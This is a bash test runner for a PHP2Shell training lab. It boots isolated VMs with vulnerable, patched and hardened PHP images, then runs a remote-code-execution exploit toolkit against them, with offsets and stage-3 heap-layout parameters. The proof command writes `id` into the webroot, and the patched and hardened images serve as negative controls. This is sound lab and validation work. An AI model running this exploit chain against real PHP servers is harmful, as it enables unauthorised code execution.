#!/usr/bin/env bash
#
# End-to-end PHP2Shell training-lab run.
#
# Topology (nothing privileged on the host):
#   host  --ssh-->  throwaway vmtest VM  --firecracker-->  lab microVM
#
# The runner boots its OWN vmtest VM (unique VM_DIR and ports, never the
# vmtest defaults), provisions it exactly like vmtest/run.sh, installs the
# shipped agent unit, registers the built images, creates one instance per
# image through the real agent API with a TCP expose, and runs the fetched
# toolkit from INSIDE the VM against an ssh -L forward of the instance's guest
# endpoint. The proof command writes `id` into the webroot and the runner
# fetches it over HTTP; the assertion is uid=33(www-data).
#
# Usage:
#   ./run.sh                 # build (cached) + full VM run
#   P2S_SKIP_BUILD=1 ./run.sh
#   KEEP_VM=1 ./run.sh       # leave the VM for debugging
#   P2S_CHAIN_RETRIES=3 ./run.sh
#
# A transport error, a missing readiness, or an unparseable API response is a
# TEST FAILURE, never a negative result. The two controls are negative by
# design and only pass after the target has been proven reachable and serving
# the expected PHP version.
set -uo pipefail
. "$(dirname -- "$0")/lib.sh"

RUN_ID=$(date +%Y%m%d-%H%M%S)-$$
LOG=$LOGS/run-$RUN_ID.log
VM_DIR=${VM_DIR:-$CACHE/vm-$RUN_ID}
if [ -z "${VM_SSH_PORT:-}" ]; then
  VM_SSH_PORT=$(free_port 2400 2500) || die "no free VM ssh port"
fi
if [ -z "${VM_SEED_PORT:-}" ]; then
  VM_SEED_PORT=$(free_port 8200 8300) || die "no free cloud-init seed port"
fi
export VM_DIR VM_SSH_PORT VM_SEED_PORT
export VM_MEM=${VM_MEM:-4096} VM_SMP=${VM_SMP:-4} VM_DISK=${VM_DISK:-40G}
TOKEN=${FIRECRACKER_AGENT_TOKEN:-p2s-token-$RUN_ID}
API=http://127.0.0.1:7001
STATE=/var/lib/rctf-firecracker/state
IMAGES_DIR=/var/lib/rctf-firecracker/images
OUTSIDE_IF=p2sout0
OUTSIDE_IP=192.0.2.1
SUBNET_POOL=10.201.0.0/16
TCP_RANGE='{ from: 31000, to: 31100 }'
if [ -z "${FWD_PORT:-}" ]; then
  FWD_PORT=$(free_port 18000 18100) || die "no free forwarded port"
fi
VMKEY=$VM_DIR/id_ed25519
TUNNEL_PID=
INSTANCES=()

mkdir -p "$LOGS"
exec 3>&1
exec >>"$LOG" 2>&1
say() {
  printf '%s\n' "$*" >&3
  printf '%s\n' "$*" >>"$LOG"
}
fail() {
  say "FAIL: $*"
  exit 1
}
vm_ssh() { "$VMTEST_DIR/vm.sh" ssh "$@"; }
# The agent listens on the VM's loopback, not on the host. Every API call is
# therefore executed inside the VM; only the response body/code is brought
# back to the host.
API_BASE=http://127.0.0.1:7001
api() { # api <path>
  vm_ssh "curl -fsS --max-time 120 -H 'Authorization: Bearer $TOKEN' \
    -H 'Content-Type: application/json' '$API_BASE$1'"
}
api_code() { # api_code <method> <path> [body-file]
  local method=$1 path=$2 body=${3:-}
  if [ -n "$body" ]; then
    vm_ssh "curl -sS --max-time 120 -o /tmp/p2s-api.out -w '%{http_code}' \
      -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' \
      -X '$method' '$API_BASE$path' --data-binary @-" <"$body"
  else
    vm_ssh "curl -sS --max-time 120 -o /tmp/p2s-api.out -w '%{http_code}' \
      -H 'Authorization: Bearer $TOKEN' -H 'Content-Type: application/json' \
      -X '$method' '$API_BASE$path'"
  fi
}
api_body() { vm_ssh 'cat /tmp/p2s-api.out 2>/dev/null'; }

cleanup() {
  local rc=$?
  if [ -n "$TUNNEL_PID" ]; then
    vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
  fi
  for id in "${INSTANCES[@]}"; do
    api_code DELETE "/v1/instances/$id" >/dev/null 2>&1 || true
  done
  if [ "${KEEP_VM:-0}" != 1 ]; then
    say "==> stopping the lab VM"
    "$VMTEST_DIR/vm.sh" stop >/dev/null 2>&1 || true
  else
    say "KEEP_VM=1: VM left running at 127.0.0.1:$VM_SSH_PORT (dir $VM_DIR)"
  fi
  say "transcript: $LOG"
  exit "$rc"
}
trap cleanup EXIT INT TERM

say "PHP2Shell training lab - $RUN_ID"
say "repo: $REPO"
say "vm:   $VM_DIR (ssh $VM_SSH_PORT, seed $VM_SEED_PORT)"
say "log:  $LOG"

command -v qemu-system-x86_64 >/dev/null || die "qemu-system-x86_64 is required"
[ -r /dev/kvm ] && [ -w /dev/kvm ] || die "/dev/kvm must be readable/writable"

# ---------------------------------------------------------------------------
# 1. Images (host-side, unprivileged)
# ---------------------------------------------------------------------------
if [ "${P2S_SKIP_BUILD:-0}" != 1 ]; then
  say "==> building images (host, unprivileged)"
  "$LAB_DIR/build.sh" || fail "image build failed"
else
  say "==> P2S_SKIP_BUILD=1: using cached images"
fi
for name in php2shell-vuln php2shell-patched php2shell-hardened; do
  [ -f "$IMAGES/$name/rootfs.ext4" ] && [ -f "$IMAGES/$name/vmlinux" ] &&
    [ -f "$IMAGES/$name/offsets.env" ] || fail "missing image $name (run build.sh)"
done

# ---------------------------------------------------------------------------
# 2. Boot + provision the throwaway VM (vmtest CLI, unchanged)
# ---------------------------------------------------------------------------
say "==> booting the vmtest VM"
"$VMTEST_DIR/vm.sh" create || fail "VM boot failed"
"$VMTEST_DIR/vm.sh" status || fail "VM is not running"

say "==> copying the checkout and shared artifacts into the VM"
if [ "${P2S_SKIP_PROVISION:-0}" = 1 ]; then
  say "==> P2S_SKIP_PROVISION=1: reusing the provisioned VM"
else
WORK_TMP=$(mktemp -d "${TMPDIR:-/tmp}/p2s-run.XXXXXX")
tar czf "$WORK_TMP/repo.tgz" -C "$REPO" --exclude=.git --exclude=node_modules .
vm_ssh 'rm -rf /tmp/p2s-repo && mkdir -p /tmp/p2s-repo && tar xzf - -C /tmp/p2s-repo' \
  <"$WORK_TMP/repo.tgz" || fail "checkout copy failed"

STAGE=$WORK_TMP/artifacts
mkdir -p "$STAGE"
cp "$SMOKE_ARTIFACTS/firecracker" "$STAGE/firecracker"
cp "$SMOKE_ARTIFACTS/dl/fc-extract/release-v1.17.0-x86_64/jailer-v1.17.0-x86_64" "$STAGE/jailer"
cp -a "$SMOKE_ARTIFACTS/dl/rootdir" "$STAGE/rootdir"
cp "$SMOKE_ARTIFACTS/dl/jq" "$STAGE/jq"
chmod 0755 "$STAGE/firecracker" "$STAGE/jailer" "$STAGE/jq"
tar czf "$WORK_TMP/artifacts.tgz" -C "$STAGE" .
vm_ssh 'rm -rf /tmp/fc-vmtest/artifacts && mkdir -p /tmp/fc-vmtest/artifacts && tar xzf - -C /tmp/fc-vmtest/artifacts' \
  <"$WORK_TMP/artifacts.tgz" || fail "artifact copy failed"
rm -rf "$WORK_TMP"

say "==> provisioning the VM (packages, bun, checkout)"
vm_ssh 'sudo REPO_SRC=/tmp/p2s-repo bash /tmp/p2s-repo/deploy/firecracker/vmtest/provision.sh' ||
  fail "provisioning failed"

say "==> installing host prerequisites and the shipped agent unit"
vm_ssh 'sudo bash /opt/rctf-firecracker/deploy/firecracker/host/host-setup.sh' ||
  fail "host-setup failed"
fi

say "==> installing the ssh client in the VM (needed for the ssh -L forward)"
vm_ssh 'sudo apt-get install -y -q --no-install-recommends openssh-client >/dev/null' ||
  fail "could not install openssh-client in the VM"

say "==> creating the lab external interface $OUTSIDE_IF ($OUTSIDE_IP/24)"
vm_ssh "sudo ip link del $OUTSIDE_IF 2>/dev/null || true
  sudo ip link add $OUTSIDE_IF type dummy
  sudo ip addr add $OUTSIDE_IP/24 dev $OUTSIDE_IF
  sudo ip link set $OUTSIDE_IF up" || fail "could not create $OUTSIDE_IF"

say "==> writing the agent configuration and starting the shipped unit"
AGENT_TMP=$(mktemp -d "${TMPDIR:-/tmp}/p2s-agent.XXXXXX")
AGENT_YAML=$AGENT_TMP/agent.yaml
AGENT_ENV=$AGENT_TMP/agent.env
cat >"$AGENT_YAML" <<YAML
hostId: p2slab
listen: { host: 127.0.0.1, port: 7001 }
stateDir: $STATE
capacity: { vcpus: 4, memMiB: 4096, diskMiB: 8192, maxInstances: 8 }
expiryGraceSeconds: 600
vm:
  mode: jailer
  firecrackerBin: /usr/local/bin/firecracker
  jailerBin: /usr/local/bin/jailer
  imagesDir: $IMAGES_DIR
  runDir: /var/lib/rctf-firecracker/run
  chrootBase: /srv/jailer
  jailUid: 10000
  jailGid: 10000
  cgroupLimits: ['pids.max=512']
network:
  publicHost: $OUTSIDE_IP
  httpDomain: p2s.test
  httpPort: 80
  httpsPort: 443
  tcpSslPort: 443
  tcpPortRange: $TCP_RANGE
  subnetPool: $SUBNET_POOL
  traefikDynamicDir: /etc/traefik/dynamic/rctf-firecracker
  externalInterface: $OUTSIDE_IF
  reuseQuarantineSeconds: 120
  requireConntrack: true
  tapUser: '10000'
  tapGroup: '10000'
YAML
printf 'FIRECRACKER_AGENT_TOKEN=%s\n' "$TOKEN" >"$AGENT_ENV"
vm_ssh "sudo install -m 0644 /opt/rctf-firecracker/deploy/firecracker/host/rctf-firecracker-agent.service /etc/systemd/system/rctf-firecracker-agent.service
  sudo mkdir -p /etc/rctf-firecracker
  sudo tee /etc/rctf-firecracker/agent.yaml >/dev/null" <"$AGENT_YAML" ||
  fail "could not install the agent configuration"
vm_ssh "sudo tee /etc/rctf-firecracker/agent.env >/dev/null" <"$AGENT_ENV" ||
  fail "could not install the agent token"
rm -f "$AGENT_YAML" "$AGENT_ENV"
rmdir "$AGENT_TMP" 2>/dev/null || rm -rf "$AGENT_TMP"
vm_ssh "sudo chmod 0600 /etc/rctf-firecracker/agent.env
  sudo systemctl daemon-reload
  sudo systemctl enable rctf-firecracker-agent >/dev/null 2>&1
  sudo systemctl restart rctf-firecracker-agent" ||
  fail "could not start the agent"

for _ in $(seq 1 60); do
  accepting=$(api "/v1/info" 2>/dev/null | jq -r '.accepting // false' 2>/dev/null) || accepting=false
  [ "$accepting" = true ] && break
  sleep 2
done
[ "${accepting:-false}" = true ] || {
  vm_ssh 'sudo journalctl -u rctf-firecracker-agent --no-pager -n 60' >&2 || true
  fail "agent did not report accepting:true"
}
say "agent accepting (jailer mode)"

# ---------------------------------------------------------------------------
# 3. Stage the images into the agent's imagesDir
# ---------------------------------------------------------------------------
say "==> staging the images into the agent's imagesDir"
IMG_TMP=$(mktemp -d "${TMPDIR:-/tmp}/p2s-images.XXXXXX")
for name in php2shell-vuln php2shell-patched php2shell-hardened; do
  say "==> staging image $name"
  tar czf "$IMG_TMP/$name.tgz" -C "$IMAGES/$name" .
  vm_ssh "sudo rm -rf $IMAGES_DIR/$name && sudo mkdir -p $IMAGES_DIR/$name &&
    sudo tar xzf - -C $IMAGES_DIR/$name &&
    sudo chown -R root:root $IMAGES_DIR/$name &&
    sudo chmod 0755 $IMAGES_DIR/$name &&
    sudo chmod 0644 $IMAGES_DIR/$name/vmlinux $IMAGES_DIR/$name/rootfs.ext4" \
    <"$IMG_TMP/$name.tgz" || fail "could not stage image $name"
  rm -f "$IMG_TMP/$name.tgz"
done
rm -rf "$IMG_TMP"

api "/v1/info" | jq -c '.images' | grep -q 'php2shell-vuln' ||
  fail "the agent does not list the staged images"

# ---------------------------------------------------------------------------
# 4. Instance + readiness + tunnel
# ---------------------------------------------------------------------------
make_spec() { # make_spec <file> <id> <image>
  local file=$1 id=$2 image=$3
  jq -n \
    --arg id "$id" --arg image "$image" \
    --argjson expires "$((($(date +%s) + 3600) * 1000))" '
    {
      id: $id, teamKey: "0123456789ab", image: $image,
      vcpus: 1, memMiB: 256, diskMiB: 1024, egress: false,
      bootTimeoutSeconds: 180,
      readiness: {kind: "tcp", port: 8080},
      env: {CHALLENGE: "php2shell"},
      expose: [{kind: "tcp", hostPrefix: "web", port: 8080}],
      expiresAtMs: $expires,
      flags: [{provider: "main", flag: "rctf{php2shell-lab-not-a-real-flag}"}]
    }' >"$file"
}

start_instance() { # start_instance <image> <suffix>; prints id
  local image=$1 suffix=$2 id spec code
  id="p2s${RUN_ID//[^a-z0-9]/}${suffix}"
  id=${id:0:62}
  spec=$(mktemp "${TMPDIR:-/tmp}/p2s-spec.XXXXXX")
  make_spec "$spec" "$id" "$image"
  code=$(api_code PUT "/v1/instances/$id" "$spec")
  rm -f "$spec"
  case "$code" in
    200 | 201) ;;
    *) fail "create $id ($image) returned HTTP $code: $(api_body | head -c 400)" ;;
  esac
  INSTANCES+=("$id")
  for _ in $(seq 1 180); do
    st=$(api "/v1/instances/$id" 2>/dev/null | jq -r '.state // "missing"' 2>/dev/null) || st=missing
    case "$st" in
      running) printf '%s\n' "$id"; return 0 ;;
      errored | failed) fail "instance $id entered state $st" ;;
    esac
    sleep 1
  done
  fail "instance $id did not reach running"
}

guest_ip() { # guest_ip <id>
  vm_ssh "sudo jq -r '.lease.guestIp // empty' $STATE/$1.json" ||
    fail "could not read the guest IP for $1"
}

start_tunnel() { # start_tunnel <guestIp>; sets TUNNEL_PID
  local gip=$1
  vm_ssh 'cat > /tmp/p2s-key && chmod 600 /tmp/p2s-key' <"$VMKEY" ||
    fail "could not stage the ssh key"
  # Kill the previous tunnel by its recorded PID. Do NOT use `pkill -f` here:
  # the pattern would also match this very ssh command line (the remote command
  # is part of the outer ssh client's argv) and kill the session before the
  # forward is created.
  vm_ssh "if [ -f /tmp/p2s-tunnel.pid ]; then sudo kill \$(cat /tmp/p2s-tunnel.pid) 2>/dev/null || true; rm -f /tmp/p2s-tunnel.pid; fi
    nohup ssh -N -i /tmp/p2s-key -p 22 \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ExitOnForwardFailure=yes -o ServerAliveInterval=10 \
      -L 127.0.0.1:$FWD_PORT:$gip:8080 ubuntu@10.0.2.15 \
      >/tmp/p2s-tunnel.log 2>&1 & echo \$! >/tmp/p2s-tunnel.pid"
  TUNNEL_PID=$(vm_ssh 'cat /tmp/p2s-tunnel.pid') || fail "tunnel did not start"
  for _ in $(seq 1 40); do
    if vm_ssh "curl -fsS --max-time 2 -o /dev/null http://127.0.0.1:$FWD_PORT/index.php" 2>/dev/null; then
      return 0
    fi
    sleep 0.5
  done
  vm_ssh 'cat /tmp/p2s-tunnel.log' >&2 || true
  fail "ssh -L tunnel to $gip:8080 did not become ready"
}

target_version() { # target_version: PHP version served through the tunnel
  vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/index.php" |
    sed -n 's/^PHP \([0-9][0-9.]*\)$/\1/p' | head -1
}

stage_toolkit() {
  local tgz
  tgz=$(mktemp "${TMPDIR:-/tmp}/p2s-toolkit.XXXXXX.tgz")
  tar czf "$tgz" -C "$CACHE" toolkit upstream-legacy
  vm_ssh 'rm -rf /tmp/p2s && mkdir -p /tmp/p2s && tar xzf - -C /tmp/p2s' <"$tgz" ||
    fail "could not stage the toolkit"
  rm -f "$tgz"
}

run_chain() { # run_chain <image> <profile>; prints launcher output
  local image=$1 profile=$2 zif dtor extra=
  read_offsets "$IMAGES/$image" || fail "no usable offsets for $image"
  zif=$ZIF_OFFSET
  dtor=$DTOR_OFFSET
  # The toolkit's calibrator measured these over HTTP on the official image
  # (stage 1 N=841/forge 63, stage 2 T=406/V=16). The launcher's --profile
  # selects the stage-3 branch; the explicit layout below is the toolkit's
  # "lab" composition (documented in profiles/php-8.4.26-deb13-apxs2-amd64.json)
  # and is tried as a second full attempt because stage 3 is build/instance
  # dependent. Both attempts are real chains; a transport error fails closed.
  if [ "$profile" = lab ]; then
    extra="P2S_STAGE3_PADS=4:4,4:4,4:4,4:4,4:4,31:31,31:31,31:31,31:31,31:31,31:31 \
      P2S_STAGE3_COOKIE=1 P2S_STAGE3_WFIELDS=5 P2S_STAGE3_FAKE_LEN=31 \
      P2S_STAGE3_FAKES=12 P2S_STAGE3_B_NAME_LEN=3"
  fi
  vm_ssh "P2S_STAGE1_N=$P2S_STAGE1_N P2S_FORGE_LEN=$P2S_FORGE_LEN \
    P2S_STAGE2_T=$P2S_STAGE2_T P2S_STAGE2_V=$P2S_STAGE2_V $extra \
    timeout 600 python3 /tmp/p2s/toolkit/tools/php2shell_rce.py \
      -u http://127.0.0.1:$FWD_PORT/index.php \
      -c 'id>/www/p' \
      --profile $profile \
      --zif-offset $zif --dtor-offset $dtor \
      --repo-dir /tmp/p2s/upstream-legacy \
      --proof-file '' --fetch /p"
}

proof_body() {
  vm_ssh "curl -fsS --max-time 10 http://127.0.0.1:$FWD_PORT/p"
}

assert_chain_green() { # assert_chain_green <image> <profile>; 0 only on a real proof
  local image=$1 profile=$2 out body
  out=$(run_chain "$image" "$profile") || {
    say "$out"
    say "  (chain attempt did not complete)"
    return 1
  }
  say "$out"
  printf '%s' "$out" | grep -q '^PROOF:' || {
    say "  (chain printed no PROOF line)"
    return 1
  }
  body=$(proof_body) || {
    say "  (could not fetch /p)"
    return 1
  }
  proof_is_web_uid "$body" || {
    say "  (proof is not the web worker uid: $body)"
    return 1
  }
  say "PASS: $image executes id as $(printf '%s' "$body" | head -1)"
  return 0
}

assert_chain_negative() { # assert_chain_negative <image> <profile> <label>
  local image=$1 profile=$2 label=$3 out rc
  out=$(run_chain "$image" "$profile")
  rc=$?
  say "$out"
  [ "$rc" -ne 0 ] || fail "$label: chain unexpectedly succeeded"
  if printf '%s' "$out" | grep -q '^PROOF:'; then
    fail "$label: chain printed a PROOF line"
  fi
  printf '%s' "$out" | grep -q 'stage 1' ||
    fail "$label: chain did not reach stage 1 (transport/setup failure, not a negative)"
  if proof_body >/dev/null 2>&1; then
    fail "$label: a proof file is served, so the negative is not real"
  fi
  say "PASS: $label failed closed (no proof)"
}

# ---------------------------------------------------------------------------
# 5. Vulnerable image: the chain must execute `id` as the web worker
# ---------------------------------------------------------------------------
say "==> creating the vulnerable instance"
VID=$(start_instance php2shell-vuln v) || fail "vulnerable instance failed"
say "vulnerable instance: $VID"
GIP=$(guest_ip "$VID")
[ -n "$GIP" ] || fail "no guest IP for $VID"
say "guest endpoint: $GIP:8080 (forwarded on 127.0.0.1:$FWD_PORT inside the VM)"
start_tunnel "$GIP"
stage_toolkit

VER=$(target_version)
[ "$VER" = "$PHP_VULN" ] || fail "vulnerable image serves PHP '$VER', expected $PHP_VULN"
say "target serves PHP $VER"

say "==> running the PHP2Shell chain"
GREEN=0
for attempt in $(seq 1 "$P2S_CHAIN_RETRIES"); do
  for profile in bookworm lab; do
    say "chain attempt $attempt/$P2S_CHAIN_RETRIES (stage-3 profile: $profile)"
    if assert_chain_green php2shell-vuln "$profile"; then GREEN=1; break 2; fi
  done
done
[ "$GREEN" = 1 ] || fail "the chain did not produce the web-uid proof"

# ---------------------------------------------------------------------------
# 6. Negative control A: fixed PHP 8.4.27
# ---------------------------------------------------------------------------
say "==> control A: patched PHP $PHP_FIXED"
api_code DELETE "/v1/instances/$VID" >/dev/null 2>&1 || true
vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
TUNNEL_PID=
PID=$(start_instance php2shell-patched p) || fail "patched instance failed"
GIP=$(guest_ip "$PID")
start_tunnel "$GIP"
VER=$(target_version)
[ "$VER" = "$PHP_FIXED" ] || fail "patched image serves PHP '$VER', expected $PHP_FIXED"
say "target serves PHP $VER"
assert_chain_negative php2shell-patched bookworm "patched PHP $PHP_FIXED"
api_code DELETE "/v1/instances/$PID" >/dev/null 2>&1 || true
vm_ssh "kill $TUNNEL_PID" >/dev/null 2>&1 || true
TUNNEL_PID=

# ---------------------------------------------------------------------------
# 7. Negative control B: production-hardened php.ini (memory_limit=128M)
# ---------------------------------------------------------------------------
say "==> control B: hardened php.ini (memory_limit=128M, OOM field is 12M)"
HID=$(start_instance php2shell-hardened h) || fail "hardened instance failed"
GIP=$(guest_ip "$HID")
start_tunnel "$GIP"
VER=$(target_version)
[ "$VER" = "$PHP_VULN" ] || fail "hardened image serves PHP '$VER', expected $PHP_VULN"
say "target serves PHP $VER"
assert_chain_negative php2shell-hardened bookworm "hardened php.ini"
api_code DELETE "/v1/instances/$HID" >/dev/null 2>&1 || true

say ""
say "ALL PHP2SHELL LAB CHECKS PASSED"
